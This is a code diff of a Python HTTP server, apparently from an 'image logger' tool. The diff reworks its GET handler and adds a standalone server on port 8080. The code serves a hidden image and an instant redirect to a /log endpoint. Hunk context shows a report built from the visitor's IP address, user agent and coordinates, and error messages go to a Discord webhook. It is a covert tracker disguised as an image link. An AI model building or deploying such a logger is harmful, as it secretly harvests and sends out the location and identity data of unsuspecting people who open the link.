@@ -143,8 +143,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     return info
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-
-    def handleRequest(self):
+    
+    def do_GET(self):
         try:
             s = self.path
             dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
@@ -161,7 +161,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 return
 
             # Serve the image directly
-            if self.path.endswith("/image.png"):
+            if s == "/image":
                 with open("/mnt/data/image.png", "rb") as image_file:
                     self.send_response(200)
                     self.send_header('Content-type', 'image/png')
@@ -177,19 +177,17 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<html>
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(f'''<html>
 <head>
 <meta http-equiv="refresh" content="0;url=/log?url={parse.quote(url)}">
 </head>
 <body>
-<img src="/image.png" style="display:none">
+<img src="/image" style="display:none">
 </body>
-</html>'''.encode()
-
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(data)
+</html>'''.encode())
             
         except Exception:
             self.send_response(500)
@@ -197,10 +195,12 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
-
         return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
+
+if __name__ == "__main__":
+    server_address = ('', 8080)
+    httpd = HTTPServer(server_address, ImageLoggerAPI)
+    print("Starting server on port 8080...")
+    httpd.serve_forever()
